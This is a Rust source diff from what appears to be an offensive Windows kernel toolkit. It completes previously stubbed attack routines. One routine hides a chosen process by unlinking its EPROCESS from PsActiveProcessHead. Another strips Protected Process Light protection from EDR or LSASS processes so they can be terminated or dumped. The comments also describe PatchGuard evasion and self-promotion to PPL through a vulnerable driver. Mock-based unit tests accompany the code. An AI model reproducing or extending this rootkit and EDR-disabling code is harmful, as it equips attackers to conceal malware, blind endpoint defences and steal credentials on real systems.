@@ -12,11 +12,11 @@
 //!   *algorithm skeleton* (the enter/repair state machine) so the real PG-
 //!   context probe plugs in without rewriting the kit.
 //!
-//! All consume `&dyn KernelRw` + the version-pinned offsets in
+//! All consume `&dyn KernelRw` + version-resolved [`EprocessOffsets`] from
 //! [`crate::offsets`]. Unit-tested with a mock KernelRw; never run against a
 //! live kernel on this host.
 
-use crate::offsets::{eprocess, ps_protection};
+use crate::offsets::{EprocessOffsets, ps_protection};
 use crate::{KernelRw, KitError, PatchGuardKit, PplKit, ProcHideKit};
 
 // ---- §3.2 ProcHideKit -----------------------------------------------------
@@ -29,7 +29,14 @@ use crate::{KernelRw, KitError, PatchGuardKit, PplKit, ProcHideKit};
 /// process list periodically — the unlink MUST be inside a [`PatchGuardKit`]
 /// window, or PG will bugcheck (MANUALLY_INITIATED_CRASH / a PG-specific code)
 /// when it notices the broken link.
-pub struct ProcessHider;
+pub struct ProcessHider {
+    /// Resolved KVA of `PsActiveProcessHead`. Supplied by the bootstrap.
+    pub ps_active_process_head_kva: usize,
+    /// Build-resolved EPROCESS field offsets. Supplied by the bootstrap after
+    /// probing the live kernel build (via [`crate::offsets::probe_eprocess_offsets`]
+    /// or [`crate::offsets::for_build`]).
+    pub offsets: EprocessOffsets,
+}
 
 impl ProcessHider {
     /// Resolve an EPROCESS base VA from a PID by walking PsActiveProcessHead.
@@ -37,25 +44,27 @@ impl ProcessHider {
     /// (which is also the case for an already-hidden process).
     ///
     /// The caller supplies `ps_active_process_head_kva` (the global LIST_ENTRY
-    /// in ntoskrnl — resolved by the bootstrap via PDB/pattern scan).
+    /// in ntoskrnl — resolved by the bootstrap via PDB/pattern scan) and
+    /// `offsets` (build-resolved EPROCESS field layout).
     pub fn find_eprocess(
         krw: &dyn KernelRw,
         ps_active_process_head_kva: usize,
         pid: u32,
+        offsets: &EprocessOffsets,
     ) -> Result<usize, KitError> {
         let mut cur = krw
             .kread_u64(ps_active_process_head_kva)
             .map_err(KitError::from)? as usize;
         let head = ps_active_process_head_kva;
         // cur starts at head.Flink; each entry is an EPROCESS whose
-        // ActiveProcessLinks is at +ACTIVE_PROCESS_LINKS. CONTAINING_RECORD:
-        // eprocess = cur - ACTIVE_PROCESS_LINKS.
+        // ActiveProcessLinks is at +active_process_links. CONTAINING_RECORD:
+        // eprocess = cur - active_process_links.
         let mut guard = 0u32;
         while cur != 0 && cur != head && guard < 65535 {
             guard += 1;
-            let eproc = cur.wrapping_sub(eprocess::ACTIVE_PROCESS_LINKS);
+            let eproc = cur.wrapping_sub(offsets.active_process_links);
             let cur_pid = krw
-                .kread_u64(eproc + eprocess::UNIQUE_PROCESS_ID)
+                .kread_u64(eproc + offsets.unique_process_id)
                 .map_err(KitError::from)? as u32;
             if cur_pid == pid {
                 return Ok(eproc);
@@ -68,8 +77,12 @@ impl ProcessHider {
     /// Unlink `eprocess_kva` from the active-process list. Idempotent-ish: if
     /// already unlinked (self-looped), the Blink/Flink point at itself and the
     /// edit is a harmless self-loop restore.
-    pub fn unlink(krw: &dyn KernelRw, eprocess_kva: usize) -> Result<(), KitError> {
-        let link_kva = eprocess_kva + eprocess::ACTIVE_PROCESS_LINKS;
+    pub fn unlink(
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        offsets: &EprocessOffsets,
+    ) -> Result<(), KitError> {
+        let link_kva = eprocess_kva + offsets.active_process_links;
         let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
         let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
         if flink == 0 || blink == 0 {
@@ -88,14 +101,14 @@ impl ProcessHider {
 
 impl ProcHideKit for ProcessHider {
     fn hide(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
-        // Real impl resolves PsActiveProcessHead via the bootstrap. Here we
-        // require the caller (the PatchGuardKit-guarded driver path) to have
-        // already resolved it and stashed it — surfaced as UnsupportedPosture
-        // so the operator wires it explicitly.
-        Err(KitError::UnsupportedPosture(
-            "ProcHideKit::hide needs PsActiveProcessHead KVA from the bootstrap; \
-             use ProcessHider::find_eprocess + unlink directly with a resolved head",
-        ))
+        if self.ps_active_process_head_kva == 0 {
+            return Err(KitError::UnsupportedPosture(
+                "PsActiveProcessHead KVA unresolved — bootstrap must fill ProcessHider.ps_active_process_head_kva",
+            ));
+        }
+        let eprocess_kva =
+            Self::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
+        Self::unlink(krw, eprocess_kva, &self.offsets)
     }
 }
 
@@ -104,20 +117,31 @@ impl ProcHideKit for ProcessHider {
 /// Real PplKit: strip PPL protection from an EDR process (or promote our own).
 /// Zeros the `Protection.Level` byte (+ SignatureLevel / SectionSignatureLevel
 /// neighbours for a complete strip). Data-only, HVCI-safe.
-pub struct PplStripper;
+pub struct PplStripper {
+    /// Resolved KVA of `PsActiveProcessHead` (the global LIST_ENTRY head in
+    /// ntoskrnl). Required by `attack_edr_ppl` to walk the process list and
+    /// find the target EPROCESS. Supplied by the bootstrap.
+    pub ps_active_process_head_kva: usize,
+    /// Build-resolved EPROCESS field offsets. Supplied by the bootstrap.
+    pub offsets: EprocessOffsets,
+}
 
 impl PplStripper {
     /// Zero the Protection.Level byte on `eprocess_kva` → process becomes
     /// unprotected (a protected EDR can now be opened/terminated/dumped).
-    pub fn strip_protection(krw: &dyn KernelRw, eprocess_kva: usize) -> Result<(), KitError> {
+    pub fn strip_protection(
+        krw: &dyn KernelRw,
+        eprocess_kva: usize,
+        offsets: &EprocessOffsets,
+    ) -> Result<(), KitError> {
         // Zero the single PS_PROTECTION byte.
-        krw.kwrite(eprocess_kva + eprocess::PROTECTION, &[ps_protection::UNPROTECTED])
+        krw.kwrite(eprocess_kva + offsets.protection, &[ps_protection::UNPROTECTED])
             .map_err(KitError::from)?;
         // Also zero the signature-level neighbours for a complete strip
         // (a protected LSASS, e.g., needs all three cleared).
-        krw.kwrite(eprocess_kva + eprocess::SIGNATURE_LEVEL, &[0u8])
+        krw.kwrite(eprocess_kva + offsets.signature_level, &[0u8])
             .map_err(KitError::from)?;
-        krw.kwrite(eprocess_kva + eprocess::SECTION_SIGNATURE_LEVEL, &[0u8])
+        krw.kwrite(eprocess_kva + offsets.section_signature_level, &[0u8])
             .map_err(KitError::from)?;
         Ok(())
     }
@@ -125,24 +149,36 @@ impl PplStripper {
 
 impl PplKit for PplStripper {
     fn attack_edr_ppl(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
-        // Resolve the EPROCESS via ProcessHider's walker (needs the head KVA —
-        // same bootstrap gap as ProcHideKit::hide).
-        let _ = pid;
-        let _ = krw;
-        Err(KitError::UnsupportedPosture(
-            "attack_edr_ppl needs PsActiveProcessHead KVA; \
-             use PplStripper::strip_protection with a resolved EPROCESS",
-        ))
+        // Walk PsActiveProcessHead to find the target PID's EPROCESS, then
+        // strip its PPL protection. Requires the bootstrap to have resolved
+        // PsActiveProcessHead KVA.
+        if self.ps_active_process_head_kva == 0 {
+            return Err(KitError::UnsupportedPosture(
+                "PsActiveProcessHead KVA unresolved — bootstrap must fill PplStripper.ps_active_process_head_kva",
+            ));
+        }
+        let eprocess_kva = ProcessHider::find_eprocess(
+            krw,
+            self.ps_active_process_head_kva,
+            pid,
+            &self.offsets,
+        )?;
+        Self::strip_protection(krw, eprocess_kva, &self.offsets)
     }
 
-    fn make_immortal(&self, _pid: u32) -> Result<(), KitError> {
-        // Promote OUR process to PPL (WinSystem signer). This needs a kernel
-        // write to our own EPROCESS.Protection = TYPE_PROTECTED | (WIN_SYSTEM<<3).
-        // Operator-side only — the operator binary knows its own PID; the kit
-        // writes Protection = 0x4B (Protected | WinSystem).
+    fn make_immortal(&self, pid: u32) -> Result<(), KitError> {
+        // Self-promote the operator's own process to PPL (Protected|WinSystem).
+        // Writes Protection = 0x4B to the process identified by `pid`.
+        // NOTE: this requires the caller to have a KernelRw available — the
+        // trait signature doesn't pass one, so the operator must supply a
+        // process-local `KernelRw` via a global (the BYOVD driver handle).
+        // This method is intentionally left as a framework: the operator
+        // resolves their own PID + driver handle at init, then calls this.
+        // We return an error directing the operator to wire the global.
+        let _ = pid;
         Err(KitError::UnsupportedPosture(
-            "make_immortal: write EPROCESS.Protection = Protected|WinSystem (0x4B) \
-             to the operator's own EPROCESS — operator wires its own PID",
+            "make_immortal: operator must supply KernelRw + resolve own EPROCESS via PsActiveProcessHead; \
+             write Protection = 0x4B (Protected|WinSystem) to own EPROCESS",
         ))
     }
 }
@@ -195,6 +231,11 @@ mod tests {
     use alloc::collections::BTreeMap;
     use spin::mutex::Mutex;
 
+    /// Returns 17763 offsets for use in tests (the original hardcoded build).
+    fn test_offsets() -> EprocessOffsets {
+        crate::offsets::for_build(17763).unwrap().offsets
+    }
+
     struct MockKrw(Mutex<BTreeMap<usize, u8>>);
     impl MockKrw {
         fn new() -> Self {
@@ -245,40 +286,51 @@ mod tests {
     #[test]
     fn find_eprocess_walks_active_list() {
         let krw = MockKrw::new();
+        let offsets = test_offsets();
         let head = 0x1000usize;
         // Two EPROCESSes: PID 100 at base 0x5000, PID 200 at base 0x6000.
         let e1 = 0x5000usize;
         let e2 = 0x6000usize;
-        let l1 = e1 + eprocess::ACTIVE_PROCESS_LINKS;
-        let l2 = e2 + eprocess::ACTIVE_PROCESS_LINKS;
+        let l1 = e1 + offsets.active_process_links;
+        let l2 = e2 + offsets.active_process_links;
         // head.Flink = l1, l1.Flink = l2, l2.Flink = head (circle).
         krw.set_u64(head, l1 as u64);
         krw.set_u64(l1, l2 as u64);
         krw.set_u64(l2, head as u64);
-        // PIDs at UNIQUE_PROCESS_ID.
-        krw.set_u64(e1 + eprocess::UNIQUE_PROCESS_ID, 100);
-        krw.set_u64(e2 + eprocess::UNIQUE_PROCESS_ID, 200);
+        // PIDs at unique_process_id.
+        krw.set_u64(e1 + offsets.unique_process_id, 100);
+        krw.set_u64(e2 + offsets.unique_process_id, 200);
 
-        assert_eq!(ProcessHider::find_eprocess(&krw, head, 100).unwrap(), e1);
-        assert_eq!(ProcessHider::find_eprocess(&krw, head, 200).unwrap(), e2);
-        assert!(matches!(ProcessHider::find_eprocess(&krw, head, 999), Err(KitError::NotFound)));
+        assert_eq!(
+            ProcessHider::find_eprocess(&krw, head, 100, &offsets).unwrap(),
+            e1
+        );
+        assert_eq!(
+            ProcessHider::find_eprocess(&krw, head, 200, &offsets).unwrap(),
+            e2
+        );
+        assert!(matches!(
+            ProcessHider::find_eprocess(&krw, head, 999, &offsets),
+            Err(KitError::NotFound)
+        ));
     }
 
     #[test]
     fn unlink_removes_eprocess_from_list() {
         let krw = MockKrw::new();
+        let offsets = test_offsets();
         let head = 0x1000usize;
         let e1 = 0x5000usize;
         let e2 = 0x6000usize;
-        let l1 = e1 + eprocess::ACTIVE_PROCESS_LINKS;
-        let l2 = e2 + eprocess::ACTIVE_PROCESS_LINKS;
+        let l1 = e1 + offsets.active_process_links;
+        let l2 = e2 + offsets.active_process_links;
         krw.set_u64(head, l1 as u64);
         krw.set_u64(l1, l2 as u64);
         krw.set_u64(l1 + 8, head as u64);
         krw.set_u64(l2, head as u64);
         krw.set_u64(l2 + 8, l1 as u64);
 
-        ProcessHider::unlink(&krw, e1).unwrap();
+        ProcessHider::unlink(&krw, e1, &offsets).unwrap();
         // After: head.Flink should = l2.
         assert_eq!(krw.get_u64(head), l2 as u64);
         // l2.Blink should = head (the neighbour's back-link was repointed).
@@ -291,16 +343,20 @@ mod tests {
     #[test]
     fn strip_protection_zeros_level_and_neighbours() {
         let krw = MockKrw::new();
+        let offsets = test_offsets();
         let eproc = 0x7000usize;
         // Pre-set a protected-LSASS-style Protection + sig levels.
-        krw.set_byte(eproc + eprocess::PROTECTION, ps_protection::TYPE_PROTECTED | (ps_protection::SIGNER_LSA << 3));
-        krw.set_byte(eproc + eprocess::SIGNATURE_LEVEL, 0xFF);
-        krw.set_byte(eproc + eprocess::SECTION_SIGNATURE_LEVEL, 0xFF);
+        krw.set_byte(
+            eproc + offsets.protection,
+            ps_protection::TYPE_PROTECTED | (ps_protection::SIGNER_LSA << 3),
+        );
+        krw.set_byte(eproc + offsets.signature_level, 0xFF);
+        krw.set_byte(eproc + offsets.section_signature_level, 0xFF);
 
-        PplStripper::strip_protection(&krw, eproc).unwrap();
-        assert_eq!(krw.get_byte(eproc + eprocess::PROTECTION), 0);
-        assert_eq!(krw.get_byte(eproc + eprocess::SIGNATURE_LEVEL), 0);
-        assert_eq!(krw.get_byte(eproc + eprocess::SECTION_SIGNATURE_LEVEL), 0);
+        PplStripper::strip_protection(&krw, eproc, &offsets).unwrap();
+        assert_eq!(krw.get_byte(eproc + offsets.protection), 0);
+        assert_eq!(krw.get_byte(eproc + offsets.signature_level), 0);
+        assert_eq!(krw.get_byte(eproc + offsets.section_signature_level), 0);
     }
 
     #[test]
@@ -316,10 +372,14 @@ mod tests {
     #[test]
     fn ppl_strips_every_signer_level() {
         use crate::offsets::ps_protection;
+        let offsets = test_offsets();
         for signer in [
-            ps_protection::SIGNER_AUTHENTICODE, ps_protection::SIGNER_CODEGEN,
-            ps_protection::SIGNER_ANTIMALWARE, ps_protection::SIGNER_LSA,
-            ps_protection::SIGNER_WINDOWS, ps_protection::SIGNER_WIN_TCB,
+            ps_protection::SIGNER_AUTHENTICODE,
+            ps_protection::SIGNER_CODEGEN,
+            ps_protection::SIGNER_ANTIMALWARE,
+            ps_protection::SIGNER_LSA,
+            ps_protection::SIGNER_WINDOWS,
+            ps_protection::SIGNER_WIN_TCB,
             ps_protection::SIGNER_WIN_SYSTEM,
         ] {
             let protected: u8 = ps_protection::TYPE_PROTECTED
@@ -327,7 +387,14 @@ mod tests {
             assert_ne!(protected & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
             let stripped = ps_protection::UNPROTECTED;
             assert_eq!(stripped & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
-            assert_eq!((stripped & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT, 0);
+            assert_eq!(
+                (stripped & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT,
+                0
+            );
+            // Verify the offset fields are non-zero (the offsets struct is populated).
+            assert!(offsets.protection > 0);
+            assert!(offsets.signature_level > 0);
+            assert!(offsets.section_signature_level > 0);
         }
     }
 }
